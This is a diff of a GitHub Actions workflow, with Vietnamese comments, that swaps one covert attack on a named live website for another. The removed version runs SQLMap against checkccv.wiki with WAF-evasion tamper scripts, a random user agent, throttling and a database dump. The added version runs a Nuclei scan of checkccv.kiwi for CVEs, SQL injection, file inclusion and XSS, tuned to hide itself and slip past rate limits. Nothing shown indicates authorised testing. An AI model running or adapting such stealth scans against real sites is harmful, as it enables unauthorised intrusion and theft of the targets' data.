@@ -1,36 +1,21 @@
-name: Stealth SQLMap Scan
+name: Nuclei Stealth Scan
 
 on:
-  workflow_dispatch: # Cho phép bạn bấm nút chạy thủ công bất cứ lúc nào
+  workflow_dispatch:
 
 jobs:
-  stealth-scan:
+  nuclei-scan:
     runs-on: ubuntu-latest
 
     steps:
-    - name: Checkout Repository
+    - name: Checkout Code
       uses: actions/checkout@v4
 
-    - name: Set up Python Environment
-      uses: actions/setup-python@v5
+    - name: Run Nuclei Scan
+      uses: projectdiscovery/nuclei-action@main
       with:
-        python-version: '3.10'
-
-    - name: Download Latest SQLMap
-      run: |
-        git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
-
-    - name: Execute Stealth Dump
-      run: |
-        cd sqlmap-dev
-        python3 sqlmap.py -u "https://checkccv.wiki/?action=home&category=5" \
-          --random-agent \
-          --tamper=space2comment,between,charencode,randomcase \
-          --delay=0.5 \
-          --threads=1 \
-          --level=3 \
-          --risk=2 \
-          --dump \
-          --start=1 \
-          --stop=10 \
-          --batch
+        target: "https://checkccv.kiwi/?action=home&category=5"
+        # Chỉ quét các lỗi nghiêm trọng và phổ biến liên quan đến web/vulnerability
+        tags: cve,sqli,lfi,xss,generic
+        # Cấu hình ẩn mình và né Rate Limit
+        flags: "-rate-limit 1 -bulk-size 1 -concurrency 1 -random-agent"
